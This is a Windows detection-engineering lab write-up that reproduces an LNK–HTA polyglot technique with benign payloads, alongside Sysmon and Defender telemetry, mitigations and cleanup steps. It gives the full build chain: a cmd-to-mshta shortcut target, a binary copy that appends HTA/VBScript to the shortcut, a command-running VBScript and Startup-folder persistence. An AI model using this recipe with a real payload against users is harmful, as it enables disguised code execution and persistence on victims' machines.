---
title: "LNK–HTA Polyglot Lab: Code Execution, Detection & Persistence"
summary: "A controlled Windows research lab that builds a benign LNK–HTA polyglot, studies its execution chain, maps forensic telemetry and tests safe Startup persistence."
category: "Windows Security"
labType: "detection-engineering"
status: "planned"
difficulty: "Intermediate"
duration: "60–90 minutes"
environment:
  - "Windows 10/11 VM"
  - "Microsoft Defender"
  - "Sysmon (recommended)"
  - "Host-only or offline network"
publishedAt: 2026-09-01
updatedAt: 2026-09-01
tags:
  - "LNK"
  - "HTA"
  - "MSHTA"
  - "Windows"
  - "Detection Engineering"
  - "Persistence"
  - "Digital Forensics"
  - "Polyglot Files"
tools:
  - "PowerShell"
  - "Microsoft Defender"
  - "Sysmon"
  - "Event Viewer"
  - "LECmd"
mitre:
  - "T1204.002 — User Execution: Malicious File"
  - "T1218.005 — System Binary Proxy Execution: Mshta"
  - "T1036 — Masquerading"
  - "T1547.009 — Shortcut Modification"
sourceName: "John Hammond — LNK+HTA polyglot demonstration"
sourceUrl: "https://www.linkedin.com/posts/johnhammond010_showcasing-an-lnkhta-polyglot-crafting-activity-7155923052160065537-mVP8"
visualLeft: ".LNK"
visualRight: ".HTA"
visualProcess: "mshta.exe"
featured: true
draft: false
---

> **Controlled lab use only.** Do not send the resulting file to another person and do not test this technique on a system without explicit authorization. The core lab uses only a message box and a marker file—never a reverse shell or real malware.

<div class="research-state">
  <strong>Research status:</strong> this page currently documents the complete research blueprint and safe validation methodology. Practical execution results, screenshots, hashes and observed detections will be added only after the lab has been performed in the isolated environment.
</div>

## Executive summary

This lab reproduces the **LNK–HTA polyglot** technique demonstrated by John Hammond. A Windows shortcut remains a valid `.lnk` file while also carrying appended HTA/VBScript content. The shortcut invokes `mshta.exe` against its own final file: Windows Shell reads the initial Shell Link structure, while MSHTA continues parsing until it reaches and executes the appended HTA section.

The objective is not merely to achieve code execution. The experiment is designed to examine the complete execution chain, compare static and behavioral detection, identify useful forensic artifacts and evaluate a harmless Startup-persistence scenario.

| Field | Value |
| --- | --- |
| Validation state | Research blueprint — practical validation pending |
| Difficulty | Intermediate |
| Estimated time | 60–90 minutes |
| Environment | Isolated Windows 10/11 VM |
| Payload policy | Message box and benign marker file only |
| Primary focus | Execution, telemetry, detection and cleanup |

## Learning objectives

- Understand the structure and behavior of a Windows `.lnk` file.
- Construct a polyglot `.lnk` + `.hta` using a harmless payload.
- Observe process ancestry and host forensic artifacts.
- Compare static file detection with behavioral detection.
- Optionally validate Startup persistence using only a marker file.
- Restore the environment and document the results honestly.

## Technique: why the same file works twice

The polyglot combines two independently interpretable sections:

```text
[binary Windows Shell Link structure][appended HTML/HTA/VBScript]
```

When the user opens the file through Explorer, Windows processes the valid Shell Link structure at the beginning and follows its configured target. The target launches `cmd.exe`, which then asks the signed Windows binary `mshta.exe` to open the same `.lnk` file.

MSHTA uses a permissive HTML parser. The binary data at the beginning is not meaningful HTML, but the parser can continue until it encounters recognizable HTML and script content. The appended HTA section is then interpreted and executed. This difference between how Windows Shell and MSHTA parse the same bytes is what makes the file a polyglot.

## Attack flow

<div class="attack-flow" role="img" aria-label="LNK HTA polyglot execution flow">
  <span>The user opens the shortcut</span>
  <span>Explorer launches cmd.exe from the LNK target</span>
  <span>cmd.exe starts mshta.exe and passes the same .lnk file</span>
  <span>MSHTA reaches the appended HTA and VBScript content</span>
  <span>The benign marker is created and the expected application opens</span>
</div>

Expected process ancestry:

```text
explorer.exe
└── cmd.exe
    └── mshta.exe
        ├── cmd.exe
        └── notepad.exe
```

## MITRE ATT&CK mapping

- [T1204.002 — User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)
- [T1218.005 — System Binary Proxy Execution: Mshta](https://attack.mitre.org/techniques/T1218/005/)
- [T1036 — Masquerading](https://attack.mitre.org/techniques/T1036/)
- [T1547.009 — Shortcut Modification](https://attack.mitre.org/techniques/T1547/009/) applies only to the optional persistence phase.

The mapping describes behaviors studied in the controlled lab. It does not mean that every LNK file or every use of `mshta.exe` is malicious.

## Lab architecture

### Minimum setup

- One Windows 10 or Windows 11 virtual machine.
- Microsoft Defender enabled.
- A VM snapshot taken before the experiment.
- Host-only networking or no network connection.

### Recommended setup

- Windows 10/11 VM as the target.
- Sysmon for process, file and optional network telemetry.
- An optional second VM used only for log collection or a benign HTTP canary.
- No production accounts, personal data, shared folders or access to an organizational network.

## Preparation

- [ ] Create a VM snapshot named `before-lnk-hta-lab`.
- [ ] Use only `C:\Lab\LnkHta` as the working directory.
- [ ] Keep Microsoft Defender enabled. A block is a successful detection result; do not bypass it.
- [ ] Record the Windows build, Defender version and start time.

Open PowerShell as a standard user:

```powershell
New-Item -ItemType Directory -Path 'C:\Lab\LnkHta' -Force
Set-Location 'C:\Lab\LnkHta'
Get-Date | Set-Content '.\lab-start.txt'
Get-ComputerInfo |
  Select-Object WindowsProductName, WindowsVersion, OsBuildNumber |
  Out-File '.\system-info.txt'
```

## Phase 1 — Validate a simple HTA

Create `C:\Lab\LnkHta\code.hta` with the following benign content:

```html
<html>
<head>
<title>John Hammond LNK-HTA Lab</title>
<HTA:APPLICATION
  ID="JHLab"
  APPLICATIONNAME="John Hammond Lab"
  SHOWINTASKBAR="no"
  WINDOWSTATE="minimize" />
<script language="VBScript">
Sub Window_OnLoad
  MsgBox "The benign HTA executed inside the isolated lab.", 64, "John Hammond Lab"
  window.close
End Sub
</script>
</head>
<body></body>
</html>
```

Test the file directly:

```powershell
mshta.exe C:\Lab\LnkHta\code.hta
```

**Expected result:** one message box appears and the HTA closes. This establishes a simple control before adding the LNK layer.

## Phase 2 — Create the blueprint shortcut

1. Inside `C:\Lab\LnkHta`, right-click and select **New → Shortcut**.
2. Set the initial location to `C:\Windows\System32\cmd.exe`.
3. Name the shortcut `blueprint.lnk`.
4. Open **Properties** and configure the following values:

```text
Target:
C:\Windows\System32\cmd.exe /d /c start "" "%SystemRoot%\System32\mshta.exe" "C:\Lab\LnkHta\Chrome.lnk"

Start in:
C:\Lab\LnkHta

Run:
Minimized
```

The shortcut does not open `code.hta` directly. It instructs `mshta.exe` to interpret the final polyglot, `Chrome.lnk`. The final file therefore acts as a shortcut to Explorer and as HTA input to MSHTA.

Changing the icon to a browser icon can demonstrate masquerading. In a personal lab, however, prefer an unmistakable name such as `JH-Lab.lnk` so the test artifact cannot be confused with a real application.

## Phase 3 — Construct the polyglot

Open Command Prompt in the lab directory:

```batch
cd /d C:\Lab\LnkHta
copy /b "blueprint.lnk"+"code.hta" "Chrome.lnk"
```

The `/b` option requests binary copying. The final file contains the original LNK bytes followed by the HTA content.

Verify that a new, larger file was created and calculate its hash:

```powershell
Get-Item `
  'C:\Lab\LnkHta\blueprint.lnk',
  'C:\Lab\LnkHta\code.hta',
  'C:\Lab\LnkHta\Chrome.lnk' |
  Select-Object Name, Length, LastWriteTime

Get-FileHash 'C:\Lab\LnkHta\Chrome.lnk' -Algorithm SHA256
```

Record the SHA-256 value with the lab results. After every change to `code.hta`, run `copy /b` again because the existing polyglot is not updated automatically.

## Phase 4 — Safe execution

Double-click `Chrome.lnk` inside the isolated VM.

Successful polyglot execution means:

- Explorer accepts the file as a normal shortcut.
- The shortcut starts `cmd.exe` minimized.
- `cmd.exe` launches `mshta.exe`.
- `mshta.exe` reads the HTA section embedded in the same `.lnk` file.
- The harmless message box appears.

If Microsoft Defender blocks the operation, record the alert, detection name, timestamp and process tree. Do not disable Defender or attempt to evade the detection.

## Phase 5 — Benign marker instead of a reverse shell

Replace only the `<script>` section in `code.hta` with the following VBScript. It writes a marker under `%TEMP%` and opens that marker in Notepad:

```html
<script language="VBScript">
Sub Window_OnLoad
  Set shell = CreateObject("WScript.Shell")
  shell.Run "cmd.exe /d /c echo LNK-HTA-LAB-EXECUTED>%TEMP%\lnk-hta-lab.txt", 0, True
  shell.Run "notepad.exe %TEMP%\lnk-hta-lab.txt", 1, False
  window.close
End Sub
</script>
```

Rebuild the polyglot:

```batch
cd /d C:\Lab\LnkHta
copy /b /y "blueprint.lnk"+"code.hta" "Chrome.lnk"
```

Verify the marker:

```powershell
Get-Content "$env:TEMP\lnk-hta-lab.txt"
```

This demonstrates arbitrary command execution without creating a command-and-control channel.

## Detection and forensics

### Windows Security Event 4688

If **Audit Process Creation** and command-line auditing are enabled, review Event ID `4688` for:

- `cmd.exe` with `explorer.exe` as its parent.
- `mshta.exe` receiving a `.lnk` file as an argument.
- A child process of `mshta.exe`, especially `cmd.exe`, `powershell.exe`, `wscript.exe` or an unfamiliar executable.

### Sysmon telemetry

Useful event IDs include:

- `1` — Process Create.
- `3` — Network Connection, only for the optional canary phase.
- `11` — File Create for the marker.
- `15` — FileCreateStreamHash for Alternate Data Streams or `Zone.Identifier`, where applicable.

Example PowerShell filter:

```powershell
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-Sysmon/Operational'
  Id = 1,3,11,15
  StartTime = (Get-Date).AddHours(-2)
} | Where-Object {
  $_.Message -match 'mshta.exe|Chrome.lnk|lnk-hta-lab.txt'
} | Select-Object TimeCreated, Id, Message
```

### Microsoft Defender

Review:

```text
Event Viewer
└── Applications and Services Logs
    └── Microsoft
        └── Windows
            └── Windows Defender
                └── Operational
```

Record:

- Whether the `.lnk` file was blocked statically.
- Whether execution was blocked when the HTA/VBScript ran.
- Whether the alert was based on a child process or behavioral detection.
- Whether a small benign modification and resulting hash produced a different result.

### Static triage

- Inspect a copy of the polyglot in a hex editor or with `strings` and locate the `<html>` marker.
- Compare the size of `blueprint.lnk` with `Chrome.lnk`.
- Inspect the shortcut target, arguments, working directory and icon.
- If Zimmerman Tools are available, parse the LNK with `LECmd` and preserve the output with the event logs.

## Control and telemetry matrix

The same benign sample is tested in three phases to compare the evidence produced by each behavior:

| Phase | Benign payload | What is measured |
| --- | --- | --- |
| A | Message box only | Static scan and the basic process tree |
| B | Marker file and Notepad | Child-process and file telemetry |
| C | Optional HTTP canary on a second host-only VM | Network telemetry without a reverse shell |

For Phase C, use only a personally controlled HTTP server on the host-only network and a simple request that records a check-in. Do not use an interactive shell, tunneling or external infrastructure. The purpose is to determine whether the available telemetry correlates `mshta.exe` with an outbound connection.

## Optional benign Startup persistence

> Use the obvious name `JH-LNK-HTA-Lab.lnk`, keep the payload harmless and complete the cleanup. Never replace a real shortcut.

Copy the lab artifact to the current user's Startup directory so it runs at the next login:

```powershell
$source = 'C:\Lab\LnkHta\Chrome.lnk'
$startup = Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup'
$destination = Join-Path $startup 'JH-LNK-HTA-Lab.lnk'
Copy-Item -LiteralPath $source -Destination $destination
```

Sign out and sign in, then confirm that only the harmless marker is created again. This models Startup execution associated with **T1547.009** without introducing a malicious payload.

## Mitigations and detection opportunities

- Block or restrict `mshta.exe` with App Control for Business/WDAC where it is not required.
- Monitor `mshta.exe` when it receives a `.lnk`, remote URL or user-writable path as an argument.
- Alert when `mshta.exe` creates a child process or initiates a network connection.
- Enable relevant Defender Attack Surface Reduction rules for obfuscated scripts and downloaded executable content.
- Keep real file extensions visible and teach users that shortcuts can execute commands.
- Inspect LNK attachments, shortcuts inside archives and shortcuts originating from USB or shared locations.
- Apply application allowlisting and least privilege.

A practical behavioral detection should combine multiple signals rather than treating the presence of `mshta.exe` alone as conclusive. A high-value sequence is:

```text
Explorer opens a user-controlled LNK
  + LNK starts a command interpreter
  + MSHTA receives the LNK as input
  + MSHTA creates a script interpreter or command-shell child
  + a new file or network connection follows
```

## Troubleshooting

### The polyglot opens only Command Prompt or no message box appears

- Confirm that the shortcut target references the final `Chrome.lnk`, not `blueprint.lnk`.
- Confirm that `code.hta` appears second in the `copy /b` command.
- Check all quotes in the target and verify that **Start in** is `C:\Lab\LnkHta`.
- Rebuild `Chrome.lnk` after every code change.

### Microsoft Defender blocks the file

- Do not disable Defender.
- Preserve the screenshot, alert name and event timestamp.
- Export the related Defender and Sysmon events.
- Treat the block as a successful result for the detection portion of the lab.

### Event ID 4688 is unavailable

- Audit Process Creation may not be enabled.
- Use Sysmon, Process Explorer or Process Monitor to capture the process tree.
- Do not change a production or domain Group Policy for this experiment.

## Cleanup and restoration

Remove only the named lab artifacts:

```powershell
$startupItem = Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\JH-LNK-HTA-Lab.lnk'
Remove-Item -LiteralPath $startupItem -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath "$env:TEMP\lnk-hta-lab.txt" -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath 'C:\Lab\LnkHta' -Recurse -Force
```

Then complete the restoration checks:

- [ ] Confirm that no lab shortcut remains in Startup.
- [ ] Sign out and sign in, then verify that the marker does not reappear.
- [ ] Preserve required logs and screenshots outside the snapshot.
- [ ] Revert the VM to the clean snapshot.

## Completion criteria

- [ ] A functional LNK–HTA polyglot was created.
- [ ] Only a benign payload was executed.
- [ ] The complete process tree was recorded.
- [ ] At least two forensic artifacts were identified.
- [ ] Startup persistence was either tested or fully documented.
- [ ] Microsoft Defender behavior was recorded.
- [ ] Cleanup or snapshot restoration was completed.

## Reflection questions

1. Which stage was detected first: the file, the script or the behavior?
2. Which telemetry remains stable if the icon and filename change?
3. What changes when the file originated from a download and carries `Zone.Identifier`?
4. Which detection logic is likely to produce the fewest false positives?
5. Why is `mshta.exe` considered a LOLBin even though it is signed by Microsoft?

## Practical validation record

The fields below will be updated from the real lab session. They intentionally remain pending until evidence has been collected.

| Evidence | Current value |
| --- | --- |
| Execution date | Pending |
| Windows build | Pending |
| Defender detection | Pending |
| SHA-256 | Pending |
| Observed process tree | Pending |
| What failed | Pending |
| Changes for the next test | Pending |

## References and attribution

- [John Hammond — LNK+HTA polyglot demonstration](https://www.linkedin.com/posts/johnhammond010_showcasing-an-lnkhta-polyglot-crafting-activity-7155923052160065537-mVP8). This lab reproduces the demonstrated technique with harmless payloads and extends it with a control/telemetry matrix, persistence validation, detection analysis and mandatory cleanup.
- [Hatching — LNK HTA Polyglot](https://hatching.io/blog/lnk-hta-polyglot/)
- [MITRE ATT&CK — Mshta, T1218.005](https://attack.mitre.org/techniques/T1218/005/)
- [Microsoft — App Control script enforcement](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/script-enforcement)
- [Microsoft Defender — Attack Surface Reduction rules](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction)
- [Microsoft Sysinternals — Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [Microsoft Security Blog — Raspberry Robin and malicious LNK usage](https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/)
